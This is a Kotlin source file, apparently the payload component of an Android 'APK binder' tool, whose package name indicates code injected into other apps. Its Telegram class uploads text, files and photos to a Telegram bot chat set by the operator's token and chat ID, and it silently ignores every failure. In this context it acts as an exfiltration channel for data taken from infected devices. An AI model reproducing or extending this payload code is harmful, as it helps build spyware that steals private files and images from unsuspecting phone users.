package Com.devhs.apkbinder.payload

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class Telegram(private val token: String, private val chatId: String) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .build()

    private fun url(method: String) = "https://api.telegram.org/bot" + token + "/" + method

    fun sendMessage(text: String): Boolean {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("text", text)
            .build()
        return exec("sendMessage", body)
    }

    fun sendDocument(fileName: String, bytes: ByteArray, caption: String? = null): Boolean {
        val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("document", fileName, bytes.toRequestBody("text/plain".toMediaType()))
        if (!caption.isNullOrEmpty()) builder.addFormDataPart("caption", caption)
        return exec("sendDocument", builder.build())
    }

    fun sendPhoto(fileName: String, bytes: ByteArray, caption: String): Boolean {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", fileName, bytes.toRequestBody("image/*".toMediaType()))
            .addFormDataPart("caption", caption)
            .build()
        return exec("sendPhoto", body)
    }

    private fun exec(method: String, body: MultipartBody): Boolean = try {
        client.newCall(Request.Builder().url(url(method)).post(body).build())
            .execute().use { it.isSuccessful }
    } catch (_: Throwable) {
        false
    }
}
